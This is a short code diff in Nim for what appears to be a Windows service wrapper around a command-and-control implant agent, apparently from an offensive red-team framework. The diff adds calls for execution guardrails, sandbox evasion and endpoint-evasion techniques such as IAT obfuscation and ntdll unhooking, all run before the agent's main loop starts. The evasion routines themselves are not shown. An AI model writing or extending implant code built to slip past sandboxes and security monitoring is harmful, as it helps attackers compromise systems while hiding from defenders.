@@ -2,8 +2,15 @@ import winim/lean
 import agent
 import std/os
 import utils/strenc
+import utils/guardrails
 
 when defined(windows):
+  # Evasion imports
+  when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll):
+    import utils/evasion
+  when defined(sandbox_evasion):
+    import utils/sandbox
+
   var
     serviceStatus: SERVICE_STATUS
     serviceStatusHandle: SERVICE_STATUS_HANDLE
@@ -18,6 +25,15 @@ when defined(windows):
   # Agent thread wrapper
   proc agentThreadProc(lpParameter: LPVOID): DWORD {.stdcall.} =
     try:
+      # Check execution guardrails before anything else
+      if not checkGuardrails():
+        return 0
+      # Run sandbox evasion before anything else
+      when defined(sandbox_evasion):
+        runSandboxEvasion()
+      # Run evasion techniques before agent starts
+      when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll):
+        runEvasionInit()
       # Call the shared agent main loop
       runAgent()
     except:
